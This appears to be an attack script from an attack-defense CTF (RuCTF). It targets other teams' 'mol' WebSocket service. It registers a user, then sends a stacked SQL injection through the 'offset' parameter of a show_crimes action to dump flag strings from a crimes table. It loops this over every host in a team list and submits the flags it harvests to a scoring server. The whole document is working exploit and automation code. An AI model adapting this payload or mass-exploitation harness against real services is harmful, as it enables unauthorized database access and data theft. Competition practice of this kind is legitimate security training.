# pip install websocket-client
import websocket
from pwn import *
import threading
import re
from time import sleep
import Queue

global flags
flags = []
threads = []

global submitted_flags
submitted_flags = []

q = Queue.Queue()


def attack(target):
    while(1):
        ws = websocket.WebSocket()
        try:
            ws.connect("ws://mol.%s/websocket" % target, timeout=0.2)
            break
        except:
            # print "FAILED for %s" % target
            # backoff
            sleep(10)

    def create_cmd(action, params):
        cmd = dumps({
            "action": action,
            "params": params
        })
        return cmd

    def auth(username, password):
        users = None
        action = "auth"
        params = {"username": username,
                  "password": password}
        cmd = create_cmd(action, params)
        ws.send(cmd)
        result = ws.recv()
        if "Welcome" in result:
            users = ws.recv()

        return {"result": result,
                "users": users}

    def register(username, password):
        params = {"username": username,
                  "password": password}
        cmd = create_cmd("register", params)
        ws.send(cmd)
        result = ws.recv()
        return result

    def show_crimes(offset):
        action = "show_crimes"
        params = {"offset": offset}

        cmd = create_cmd(action, params)
        ws.send(cmd)
        result = ws.recv()
        return result

    register("ocean", "ocean")

    auth("ocean", "ocean")

    offset = "100000234213551; SELECT crimeid, description, article, city, country, crimedate, true FROM crimes WHERE description LIKE '%%=' LIMIT 8 OFFSET (SELECT COUNT(*) FROM crimes WHERE description LIKE '%%=')-8 -- "

    result = show_crimes(offset)

    ws.close()
    matches = re.findall("\w{31}=", result)

    for flag in matches:
        q.put(flag)  # put the flag in queue

    # service not patched, again!!! :)
    if matches:
        threading.Thread(target=attack, args=(target,))
    else:
        pass
        # print "no matches for %s, no more spawning" % target


def submit_flags(flags):

    try:
        r = remote("flags.e.ructf.org", 31337)
        r.read()

        count = 0
        for flag in flags:
            if flag in submitted_flags:
                continue
            r.send(flag + "\n")

            output = r.recv()
            if "Accepted" in output:
                count += 1
            submitted_flags.append(flag)
            flags.remove(flag)
        r.close()

    except Exception as e:
        print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    print "OK %d flags" % count

teams = []
with open("tlist", "r") as ff:
    for i in ff.readlines():
        i = i.rstrip('\n')
        teams.append(i)


def submitter():
    while(1):
        flags = []
        try:
            for i in xrange(0, 100):
                flag = q.get()
                if flag not in submitted_flags:
                    flags.append(flag)
        except:
            print "no flags, waiting..."
            pass
        # let's submit the list of flags
        if flags:
            print "submitting %d/%d flags" % (len(flags), q.qsize())
            submit_flags(flags)
        else:
            print "no flags waiting"
        sleep(15)
# now we have the list of teams
# let's spawn threads for each team
t = threading.Thread(target=submitter)  # start the submitter

t.start()

threads.append(t)


for t in teams:
    # attacking
    print "attacking", t
    th = threading.Thread(None, attack, args=(t,))
    threads.append(th)
    th.start()
